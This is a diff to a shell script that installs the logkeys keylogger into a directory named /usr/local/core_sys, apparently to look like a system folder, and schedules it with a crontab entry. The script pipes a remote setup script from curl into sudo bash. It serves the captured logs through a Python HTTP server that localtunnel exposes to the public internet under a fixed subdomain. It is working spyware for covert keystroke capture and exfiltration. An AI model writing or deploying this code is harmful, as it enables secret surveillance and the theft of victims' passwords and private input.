@@ -13,8 +13,34 @@ if [ ${CHECK_PROC} -gt 3 ]; then
     exit 1
 fi
 
-# Check if install directory exists (if not, create it)
+# Check if program is already installed (if not, install it)
 INSTALL_DIR="/usr/local/core_sys"
+INSTALL() {
+    echo "Installing.."
+    apt install curl
+    curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
+    apt install -y python3 build-essential autotools-dev autoconf kbd git nodejs npm 
+    rm -rf ${INSTALL_DIR}
+    git clone https://github.com/kernc/logkeys.git ${INSTALL_DIR}
+    cd ${INSTALL_DIR}
+    ./autogen.sh
+    cd ${INSTALL_DIR}/build
+    ../configure
+    
+    make
+    make install
+    
+    apt install -y npm nodejs
+    npm install -g localtunnel
+}
+
+if ! command -v logkeys >/dev/null 2>&1
+then
+    INSTALL
+fi
+
+# Check if install directory exists (if not, create it)
+
 if [ ! -d ${INSTALL_DIR} ]; then
     mkdir ${INSTALL_DIR}
 fi
@@ -41,27 +67,6 @@ if [ ! -f ${CRON_FILE} ]; then
     echo "Crontab created is running"
 fi
 
-# Check if program is already installed (if not, install it)
-INSTALL() {
-    echo "Installing.."
-    apt install -y python python3 build-essential autotools-dev autoconf kbd
-    git clone https://github.com/kernc/logkeys.git $INSTALL_DIR
-    cd $INSTALL_DIR
-    ./autogen.sh
-    cd build
-    ../configure
-    
-    make
-    make install
-    
-    apt install -y npm nodejs
-    npm install -g localtunnel
-}
-
-if ! command -v logkeys >/dev/null 2>&1
-then
-    INSTALL
-fi
 
 # Start keylogger
 KEYLOGGER() {
@@ -78,10 +83,10 @@ KEYLOGGER() {
     done
 }
 
-# FTP Server
+# FTP Servert
 FTP_SERVER() {
     echo "Starting ftp server.."
-    cd $INSTALL_DIR
+    cd ${INSTALL_DIR}
     cmd1="python3 -m http.server 31"
     eval "${cmd1}" &>/dev/null & disown;
     cmd2="lt --local-host 0.0.0.0 --port 31 --subdomain logger812432"
